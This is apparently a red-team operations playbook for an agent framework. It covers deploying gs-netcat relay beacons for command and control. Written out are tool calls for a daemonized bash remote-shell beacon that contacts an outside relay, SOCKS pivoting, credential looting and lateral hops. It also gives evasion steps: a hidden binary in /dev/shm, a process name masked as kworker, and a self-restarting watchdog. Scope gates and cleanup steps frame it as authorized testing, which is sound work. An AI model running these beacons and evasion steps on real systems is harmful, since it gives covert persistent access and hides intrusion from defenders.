# Playbook — Relay C2 (gs-netcat)

NAT-proof C2 and SOCKS pivots when Phase 2's direct SSH can't reach: gs-netcat
connects two ends that are **both** behind NAT/firewalls through a relay
(public GSRN, or your own via `GS_HOST`/`GS_PORT`). End-to-end encrypted
(SRP/AES-256) — the relay sees ciphertext and timing only. Deploy beacons
**only** to authorized, in-scope hosts.

## Gates (all must hold before relay contact)
1. `COBRA_ENABLE_TUNNELS=1` — relay C2 is a pivot primitive (xint equivalent).
2. Egress rule — relay **outside** scope (incl. the public GSRN when `GS_HOST`
   is unset) additionally needs `COBRA_ALLOW_INTERNET=1`. A relay **inside**
   scope (lab/self-hosted, e.g. `GS_HOST=192.168.56.1 GS_PORT=7350`) needs only
   gate 1. The client forwards operator-set `GS_HOST`/`GS_PORT` to the server.
3. `c2_gs_deploy` over SSH is scope-checked per hop like `exec_ssh` — the
   beacon's relay contact happens from the *target*, not the operator box.

## Flow
1. **Secret** — `c2_gs_secret` (or let `c2_gs_deploy` mint one).
2. **Deploy a shell beacon** — `c2_gs_deploy mode=shell host=<foothold> user=<u>
   key_path=<key>` (auto: arch check → base64 upload to `/dev/shm/.gsnc` →
   daemonized launch → pgrep verify), or paste the printed one-liner into an
   existing shell on the target. Optional `masq=kworker` masquerades the
   process name (`exec -a`).
3. **Task it** — `c2_gs_shell beacon=<id> command='id; uname -a; ip a'`.
   Output → loot; exit code rides a sentinel. Enumerate next hops exactly like
   the lateral playbook's "enumerate from inside" step.
4. **Pivot** — `c2_gs_deploy mode=socks ...` (second beacon, second secret),
   then `c2_gs_socks_start beacon=<id>` → tunnel id. Every recon/web/creds
   tool takes `via="<tunnel-id>"` — same as an ssh -D tunnel.
5. **Hop again** — loot creds from inside, `exec_ssh`/`ssh_key_setup` on the
   next machine, or another gs beacon where SSH can't reach.

## Beacon modes
| mode | gs-netcat flags | use |
|---|---|---|
| `shell` (default) | `-l -e /bin/bash -q -D` | automation — `c2_gs_shell` (clean, no PTY echo) |
| `socks` | `-l -S -q -D` | pivot — `c2_gs_socks_start` → `via=` routing |
| `login` | `-l -i -q -D` | human PTY — operator attaches by hand (`gs-netcat -k <keyfile> -i`) |

## Decision points
- Beacon not listening (`-t` preflight fails)? Relay unreachable from the
  target (egress filtered) → fall back to Phase 2 (`tunnel_socks_start`), or
  run your own relay on an in-scope box (`GS_HOST`/`GS_PORT`).
- Target has no gs-netcat and arch differs from the operator box → fetch the
  matching static build (`gs-netcat_linux-<arch>` — cobrashell `bin gs-netcat`
  / the COBRA .onion, never a random mirror) and run the one-liner manually.
- UDP through the pivot? SOCKS is TCP-only — run nmap from the foothold via
  `c2_gs_shell` / `exec_ssh` instead.
- Windows target? Deferred `ad` profile (netexec/impacket) — gs-netcat is
  Linux/macOS here.
- Tor-hidden relay contact (`gs-netcat -T`)? That's Phase 5 (`.onion` via
  `COBRA_PROXY`) — manual only for now.

## OPSEC
- Binary lives at `/dev/shm/.gsnc` (tmpfs — gone on reboot, no disk artifact).
- Secret rides `GSOCKET_ARGS` on the target and a 0600 keyfile in
  `$COBRA_LOOT_DIR/keys/` on the operator box — never argv, logs, or state
  (state keeps a 4-char label only).
- `-D` = daemon + watchdog: a killed beacon **restarts**. Cleanup is the
  double-`pkill` printed by `c2_gs_deploy` / `c2_gs_list`.
- The relay learns connection metadata (timing, sizes) even though content is
  E2E-encrypted — use your own relay for sensitive engagements.

## Output discipline
- Record each beacon in brain `Access` (id, mode, host, label, tunnel id).
- Cleanup at engagement end: run every cleanup command from `c2_gs_list`
  (via `exec_ssh` or `c2_gs_shell` itself), `tunnel_stop` all ids, and remove
  the keyfiles in `$COBRA_LOOT_DIR/keys/` (brain Cleanup Checklist).
